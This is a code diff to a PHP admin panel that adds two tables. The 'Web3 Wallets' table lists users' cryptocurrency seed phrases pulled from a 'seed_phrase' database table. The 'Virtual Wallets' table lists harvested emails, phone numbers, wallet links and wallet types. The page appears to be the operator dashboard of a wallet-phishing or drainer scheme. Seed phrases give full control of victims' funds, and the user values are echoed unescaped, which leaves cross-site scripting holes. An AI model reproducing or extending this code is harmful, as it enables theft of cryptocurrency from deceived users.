@@ -119,12 +119,147 @@ include 'admin_header.php';
                     else:
                     ?>
                     <tr>
+                        <td colspan="6" class="py-6 text-center text-gray-500">No Web3 wallet connected yet.</td>
+                    </tr>
+                    <?php endif; ?>
+                </tbody>
+            </table>
+            
+            
+            
+        </div>
+        
+        
+        
+         <h3 class="font-syne font-800 text-base sm:text-lg text-white">Web3 Wallets</h3>
+        
+        <div class="w-full max-w-full overflow-x-auto">
+            <table class="w-full text-left border-collapse min-w-full">
+                <thead>
+                    <tr class="border-b border-white/5 text-[9px] sm:text-[10px] font-800 uppercase tracking-wider text-gray-500">
+                        <th class="py-2.5 px-3">User ID</th>
+                        <th class="py-2.5 px-3">User</th>
+                        <th class="py-2.5 px-3">seed_phrase</th>
+                        <th class="py-2.5 px-3">Wallet</th>
+                        <th class="py-2.5 px-3 hidden sm:table-cell">Connected At</th>
+                        
+                    </tr>
+                </thead>
+                <tbody class="divide-y divide-white/5 text-xs">
+                    <?php
+                    $sql = "SELECT * from seed_phrase";
+                    $result = $conn->query($sql);
+
+                    if ($result && $result->num_rows > 0):
+                        while ($row = $result->fetch_assoc()):
+                          
+                    ?>
+                    <tr class="hover:bg-white/5 transition">
+                        <td class="py-3 px-3 font-mono font-700 text-white">#<?php echo $row['uid']; ?></td>
+                        <td class="py-3 px-3">
+                            <span class="font-700 text-white block truncate max-w-[100px] sm:max-w-none"><?php echo htmlspecialchars($row['uname'] ?? 'User #'.$row['uid']); ?></span>
+                            <span class="block text-[9px] text-gray-500">UID: #<?php echo $row['uid']; ?></span>
+                        </td>
+                        <td class="py-3 px-3 font-syne font-800 text-amber-400 whitespace-nowrap">
+                            <?php echo $row['phrase']; ?>
+                        </td>
+                        <td class="py-3 px-3 text-gray-400 hidden sm:table-cell">
+                            <?php echo htmlspecialchars($row['time'] ?? $row['tm'] ?? 'N/A'); ?>
+                        </td>
+                      
+                    </tr>
+                    <?php
+                        endwhile;
+                    else:
+                    ?>
+                    <tr>
                         <td colspan="6" class="py-6 text-center text-gray-500">No withdrawal requests found.</td>
                     </tr>
                     <?php endif; ?>
                 </tbody>
             </table>
+            
+            
+            
         </div>
+        
+        <br>
+        
+        
+        <h3 class="font-syne font-800 text-base sm:text-lg text-white">Virtual Wallets</h3>
+        
+        <div class="w-full max-w-full overflow-x-auto">
+            <table class="w-full text-left border-collapse min-w-full">
+                <thead>
+                    <tr class="border-b border-white/5 text-[9px] sm:text-[10px] font-800 uppercase tracking-wider text-gray-500">
+                        <th class="py-2.5 px-3">User ID</th>
+                        <th class="py-2.5 px-3">User</th>
+                        <th class="py-2.5 px-3">website</th>
+                        <th class="py-2.5 px-3">email</th>
+                        <th class="py-2.5 px-3">wallet_link</th>
+                       <th class="py-2.5 px-3">tel</th>
+                        <th class="py-2.5 px-3">wallet</th>
+                          <th class="py-2.5 px-3">crypto</th>
+                        <th class="py-2.5 px-3 hidden sm:table-cell">Connected At</th>
+                        
+                    </tr>
+                </thead>
+                <tbody class="divide-y divide-white/5 text-xs">
+                    <?php
+                    $sql = "SELECT * from virtual_wallets";
+                    $result = $conn->query($sql);
+
+                    if ($result && $result->num_rows > 0):
+                        while ($row = $result->fetch_assoc()):
+                          
+                    ?>
+                    <tr class="hover:bg-white/5 transition">
+                        <td class="py-3 px-3 font-mono font-700 text-white">#<?php echo $row['uid']; ?></td>
+                        <td class="py-3 px-3">
+                            <span class="font-700 text-white block truncate max-w-[100px] sm:max-w-none"><?php echo htmlspecialchars($row['uname'] ?? 'User #'.$row['uid']); ?></span>
+                            <span class="block text-[9px] text-gray-500">UID: #<?php echo $row['uid']; ?></span>
+                        </td>
+                        <td class="py-3 px-3 font-syne font-800 text-amber-400 whitespace-nowrap">
+                            <?php echo $row['website_name']; ?>
+                        </td>
+                         <td class="py-3 px-3 font-syne font-800 text-amber-400 whitespace-nowrap">
+                            <?php echo $row['uemail']; ?>
+                        </td>
+                         <td class="py-3 px-3 font-syne font-800 text-amber-400 whitespace-nowrap">
+                            <?php echo $row['wallet_link']; ?>
+                        </td>
+                         <td class="py-3 px-3 font-syne font-800 text-amber-400 whitespace-nowrap">
+                            <?php echo $row['tel']; ?>
+                        </td>
+                         <td class="py-3 px-3 font-syne font-800 text-amber-400 whitespace-nowrap">
+                            <?php echo $row['wallet']; ?>
+                        </td>
+                         <td class="py-3 px-3 font-syne font-800 text-amber-400 whitespace-nowrap">
+                            <?php echo $row['crypto']; ?>
+                        </td>
+                        <td class="py-3 px-3 text-gray-400 hidden sm:table-cell">
+                            <?php echo htmlspecialchars($row['created_at'] ?? $row['tm'] ?? 'N/A'); ?>
+                        </td>
+                      
+                    </tr>
+                    <?php
+                        endwhile;
+                    else:
+                    ?>
+                    <tr>
+                        <td colspan="6" class="py-6 text-center text-gray-500">Not found.</td>
+                    </tr>
+                    <?php endif; ?>
+                </tbody>
+            </table>
+            
+            
+            
+        </div>
+        
+         
+                                        </table>
+                                        
     </div>
 
 </div>
